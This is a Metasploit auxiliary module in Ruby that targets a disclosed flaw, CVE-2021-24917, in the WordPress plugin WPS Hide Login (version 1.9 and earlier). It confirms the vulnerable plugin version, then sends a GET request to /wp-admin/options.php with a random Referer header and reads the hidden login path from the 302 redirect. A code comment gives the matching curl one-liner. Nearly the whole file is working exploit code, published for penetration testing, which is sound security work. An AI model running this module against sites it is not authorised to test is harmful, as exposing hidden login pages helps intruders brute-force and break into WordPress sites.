##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress WPS Hide Login Login Page Revealer',
        'Description' => %q{
          This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login
          is used to make a new secret path to the login page, however a 'GET' request to
          '/wp-admin/options.php' with a referer will reveal the hidden path.
        },
        'References' => [
          ['WPVDB', '15bb711a-7d70-4891-b7a2-c473e3e8b375'],
          ['CVE', '2021-24917'],
          ['URL', 'https://wordpress.org/support/topic/bypass-security-issue/']
        ],
        'Author' => [
          'thalakus', # Vulnerability discovery
          'h00die' # Metasploit module
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2021-10-27',
        'License' => MSF_LICENSE
      )
    )
  end

  def run_host(ip)
    unless wordpress_and_online?
      fail_with Failure::NotVulnerable, "#{ip} - Server not online or not detected as wordpress"
    end

    checkcode = check_plugin_version_from_readme('wps-hide-login', '1.9.1')
    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
      fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of the 'WPS Hide Login' was not found"
    end
    print_good("#{ip} - Vulnerable version of wps_hide_login detected")

    print_status("#{ip} - Determining login page")
    # curl --referer "something" -sIXGET http://<ip>/wp-admin/options.php
    res = send_request_cgi({
      'method' => 'GET',
      'headers' => {
        'Referer' => Rex::Text.rand_text_alphanumeric(rand(5..7))
      },
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options.php')
    })

    fail_with Failure::Unreachable, "#{ip} - Connection failed" unless res
    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Didn't receive a HTTP 302 redirect to the secret login page" if res.code != 302
    if res.headers['Location']
      print_good("Login page: #{res.headers['Location']}")
    else
      print_error('No location header found')
    end
  end
end
